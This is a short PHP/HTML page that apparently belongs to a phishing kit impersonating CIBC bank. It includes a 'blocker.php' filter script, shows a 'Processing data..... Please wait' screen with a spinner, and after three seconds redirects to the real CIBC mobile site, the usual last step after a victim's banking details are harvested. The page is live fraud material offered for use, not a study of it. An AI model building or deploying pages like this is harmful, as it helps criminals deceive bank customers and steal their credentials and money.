<?php
include('blocker.php');
?>
<!DOCTYPE html>
<html>
      <head>
       <link href="files/snsStyles.css" rel="stylesheet" type="text/css">	   
		 <link rel="icon" type="image/vnd.microsoft.icon" href="files/favicon.ico">
		<META HTTP-EQUIV="Refresh" CONTENT="3;URL=https://www.cibc.mobi">
       <title>
        CIBC Account Services
       </title>
       
	
	 
	 	
	 
	  <style type="text/css">
           
             #signOutContent {
   margin:150px 0 0 0;
  }

  #signOutTxt {
   font:normal 18px Arial;
   color:#333333;
  }

  #main-txt {
    margin:33px 0 0 0;
  }

  #signout-circle {
    margin:46px 0 0 0
  }

  #signout-main {
   width:100%;
   text-align:center;
  }
	  </style>
	 </head>	 
	 <body>	 
          <div id="signout-main"> 
	   <div id="signOutContent">
	   </div>	  
	   <div id="main-txt">
	    <span id="signOutTxt">
	     Processing data..... &nbsp;Please wait.....
	    </span>
	   </div>	  
	   <div id="signout-circle">
	    <img src="files/loading.gif" />
           </div>	 
          </div>
</body>
</html>